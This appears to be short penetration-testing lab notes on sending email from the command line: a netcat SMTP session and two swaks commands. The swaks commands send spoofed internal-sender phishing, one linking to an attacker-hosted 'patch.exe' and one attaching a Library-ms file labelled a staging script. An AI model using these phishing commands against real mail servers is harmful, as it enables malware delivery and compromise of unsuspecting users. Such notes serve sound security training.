### Netcat interact with smtp server with annoymous login(line by line copy)
```
0.nc -C mail.example.org 25 //Insert a carriage return character (Ctrl+V Ctrl+M)
1.HELO example.com
2.MAIL FROM:bar@example.org
3.RCPT TO:foo@example.com
4.DATA
From: bar@example.org
To: foo@example.com
Subject: Test
Date: Thu, 20 Dec 2012 12:00:00 +0000

Testing
.
5.QUIT
```

### swaks to send email
swaks --to "tharper@victim" --from "rmurray@victim" --ehlo victim --body "Following link is urgent patch link: http://192.168.119.130/patch.exe" --header "Subject:urgent patch" --server 192.168.130.55(email server)

swaks --to jim@relia.com --from maildmz@relia.com --server 192.168.193.189 --attach @/home/kali/Desktop/config.Library-ms --body "Please take a look at the config library file" --header "Subject: Staging Script"
